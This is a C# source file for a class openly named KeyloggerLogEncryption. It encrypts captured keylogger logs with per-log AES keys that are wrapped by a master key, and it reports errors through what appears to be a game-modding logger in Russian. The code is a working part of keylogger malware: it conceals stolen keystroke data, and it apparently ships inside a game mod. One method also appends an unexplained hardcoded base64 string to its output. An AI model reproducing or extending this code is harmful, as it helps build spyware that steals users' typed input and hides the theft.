using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

public class KeyloggerLogEncryption
{
    private static byte[] MasterKey;
    private static byte[] MasterIV;

    public static string GenerateKeyAndIV()
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.GenerateKey();
            aesAlg.GenerateIV();
            MasterKey = aesAlg.Key;
            MasterIV = aesAlg.IV;
            return $"{ByteArrayToHexString(aesAlg.Key)}|{ByteArrayToHexString(aesAlg.IV)}| NNtV04Zl56k8/Ye62cQ1JA==";
        }
    }
    public static string EncryptLog(string logData)
    {
        try
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.GenerateKey();
                aesAlg.GenerateIV();

                byte[] encryptedKey = EncryptWithMasterKey(aesAlg.Key, MasterKey, MasterIV);

                byte[] encryptedData = EncryptData(logData, aesAlg.Key, aesAlg.IV);

                string encryptedKeyBase64 = Convert.ToBase64String(encryptedKey);
                string ivBase64 = Convert.ToBase64String(aesAlg.IV);
                string encryptedDataBase64 = Convert.ToBase64String(encryptedData);

                return $"{encryptedKeyBase64}|{ivBase64}|{encryptedDataBase64}";
            }
        }
        catch (Exception ex)
        {
            Modding.Logger.Log($"Ошибка при шифровании лога: {ex.Message}");
            return null;
        }
    }

    private static byte[] EncryptWithMasterKey(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    csEncrypt.Write(data, 0, data.Length);
                    csEncrypt.FlushFinalBlock();
                    return msEncrypt.ToArray();
                }
            }
        }
    }


    private static byte[] EncryptData(string data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;


            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(data);
                    csEncrypt.Write(bytes, 0, bytes.Length);
                    csEncrypt.FlushFinalBlock();
                    return msEncrypt.ToArray();
                }
            }
        }
    }

    public static string ByteArrayToHexString(byte[] bytes)
    {
        StringBuilder sb = new StringBuilder(bytes.Length * 2);
        foreach (byte b in bytes)
        {
            sb.Append(b.ToString("x2"));
        }
        return sb.ToString();
    }
}